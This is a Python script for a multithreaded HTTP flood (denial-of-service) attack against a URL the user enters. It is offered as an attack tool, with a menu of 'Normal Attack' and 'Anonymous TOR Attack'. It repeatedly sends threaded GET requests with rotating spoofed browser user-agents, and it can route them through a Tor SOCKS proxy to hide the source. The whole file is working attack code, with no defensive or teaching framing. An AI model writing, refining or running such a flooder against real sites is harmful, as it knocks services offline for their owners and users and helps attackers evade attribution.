import threading
import requests
import os
import sys
from pystyle import Colorate, Colors

banner ="""
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*: .+@@@@@@@@@@@@@@@@#+-=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+.     .=*%@@@@@@@@%*-.   %@@@@@@@@@@@@@@@@@@@%*-*@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+.           :=*%@@*-       %@@@@@@@@@@@@@@@@@*-  +@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%###*##**=+++++++++++++==+*+-:::..   :%@@@@@%%@@@@@@%+.   +@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%##**++++====+#%=--::::::::::::::::----==+++++++==*#+-..%@@@@%=.    -@@@@@@@@@@@@@
@@@@@@@@@@@%.       .=         -%:                             ..::---==+++=:       #@@@@@@@@@@@@@
@@@@@@@@@@@%%#**+=-:. ..      .   #%:::::..                                          :@@@@@@@@@@@@@@
@@@@@@@@@@@#+=-:.::---=-:.   ..  :@%==-:..                                           :@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%#*+=-:..       .:=#*.    ............                      :-=-:      .@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%%#**+=====:..   ...:::::::..........        .+*+:..%@@@@#-     +@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=     -%%%%%%%%%%%%%@@@%=.    -@@@@@@%%@@@@@@#-    %@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+  -: -%@@@@@@@@@@@@@@@@%+:  *@@@@@@@@@@@@@@@@#-. .%@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@%+=#@@@@@@@@@@@@@@@@@@#==%@@@@@@@@@@@@@@@@@%*-:#@@@@@@@@@@
"""

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def make_request(url, user_agent, option):
    try:
        if option == 1:
            headers = {'User-Agent': user_agent}
            response = requests.get(url, headers=headers, timeout=1)
            print(f"Response Code: {response.status_code}")
        elif option == 2:
            proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
            headers = {'User-Agent': user_agent}
            response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
            print(f'Response Code: {response.status_code}')
    except Exception as e:
        print(Colorate.Horizontal(Colors.green_to_blue, f"Failed to make request to {url}: {str(e)}"))
        sys.exit()

def main(url, option):
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:109.0) Gecko/20100101 Firefox/112.0  uacq',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.189 Safari/537.36 Vivaldi/1.95.1077.55',
        'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 10.0; AOL 9.7; AOLBuild 4346.13; Windows NT 6.2; WOW64; Trident/7.0; LCJB)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.6 Safari/525.19',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36  uacq',
        'Mozilla/5.0 (X11; CrOS aarch64 15329.44.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5765.224 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 OPR/80.0.4170.16',
        'Mozilla/5.0 (Linux; Android 12; RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36  uacq'
    ]
    
    threads = []
    for ua in user_agents:
        thread = threading.Thread(target=make_request, args=(url, ua, option))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    clear_console()
    print(Colorate.Horizontal(Colors.red_to_blue, banner))
    print(Colorate.Horizontal(Colors.green_to_yellow, '[1] Normal Attack\n[2] Anonymous TOR Attack'))
    try:
        option = int(input(Colorate.Horizontal(Colors.green_to_yellow,'=> ')))
        if option == 1 or option == 2:
            url = input(Colorate.Horizontal(Colors.green_to_yellow, 'URL => '))
            # Validación de la URL
            if not url.startswith(('https://', 'http://')):
                url = 'http://' + url
            try:
                while True:
                    main(url, option)
            except KeyboardInterrupt:
                clear_console()
                sys.exit()
        else:
            print(Colorate.Horizontal(Colors.red_to_green, '!!Incorrect option!!'))

    except KeyboardInterrupt:
        sys.exit()    

    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f'!ERROR {str(e)}!'))
